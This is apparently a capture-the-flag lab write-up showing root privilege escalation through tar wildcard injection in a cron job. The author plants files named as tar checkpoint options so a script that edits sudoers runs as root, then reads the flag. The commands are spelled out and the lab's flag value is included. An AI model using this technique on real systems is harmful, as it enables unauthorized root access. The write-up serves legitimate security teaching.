## Goal is to escalate privileges to root and retrieve the /root/flag.txt file contents using a wildcard injection vulnerability in an automated cron job.

> In this task, an inspection of the system's cron configurations inside /etc/cron.d/ revealed an automated backup script running under the root context:

Shell

```bash
user@af8b3519640a4f0bbb4854165e974ee7-2377118072:~/dropbox$ cat /etc/cron.d/my-cron-job
* * * * * root (cd /home/user/dropbox; /usr/bin/tar -czf /tmp/dropbox_backup.tar.gzz *) 2>&1
```

The vulnerability lies in the use of the wildcard (*) character inside the tar command invocation. When the shell executes this command, it expands the wildcard into a list of all files present within the /home/user/dropbox directory. If file names are crafted to look like command-line switches (e.g., starting with --), tar will parse them as command options rather than standard file arguments.


tar possesses built-in capabilities designed for checkpoint tracking, which allow executing system commands when a specific file processing threshold is met:

```Code snippet

--checkpoint[=NUMBER]      display progress messages every NUMBERth record
--checkpoint-action=ACTION execute ACTION at each checkpoint
```


By planting specially named files in the working directory, we can force the root-run tar binary to execute an arbitrary payload script upon hitting a checkpoint.

> To weaponize this behavior, we generate two flag files to serve as the arguments to tar during wildcard expansion, alongside a payload script (privesc.sh) engineered to inject our user into the server's sudoers configuration:

```Bash

user@af8b3519640a4f0bbb4854165e974ee7-2377118072:~/dropbox$ echo "" > '--checkpoint=1'
user@af8b3519640a4f0bbb4854165e974ee7-2377118072:~/dropbox$ echo "" > '--checkpoint-action=exec=bash privesc.sh'
user@af8b3519640a4f0bbb4854165e974ee7-2377118072:~/dropbox$ nano privesc.sh
user@af8b3519640a4f0bbb4854165e974ee7-2377118072:~/dropbox$ chmod +x privesc.sh 
```


Once the cron job triggers its minutely cycle, the wildcard expands to include our flags. tar executes privesc.sh with root permissions, shifting our privilege boundaries. Checking sudo -l confirms our updated execution rights:

Bash

```
user@af8b3519640a4f0bbb4854165e974ee7-2377118072:~/dropbox$ sudo -l
User user may run the following commands on af8b3519640a4f0bbb4854165e974ee7-2377118072:
    (root) NOPASSWD: ALL
```


With full NOPASSWD access configured, we upgrade cleanly to a root shell environment, shift directories to the root home profile, and pull the contents of the target flag:

Bash

```
user@af8b3519640a4f0bbb4854165e974ee7-2377118072:~/dropbox$ sudo su
root@af8b3519640a4f0bbb4854165e974ee7-2377118072:/home/user/dropbox# cd /root
root@af8b3519640a4f0bbb4854165e974ee7-2377118072:~# cat flag.txt
your flag is 40aacfa8a3817226ac4f95cff220e1fd
```

FLAG: 40aacfa8a3817226ac4f95cff220e1fd

---

You can find an article about this abuse [here](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa)
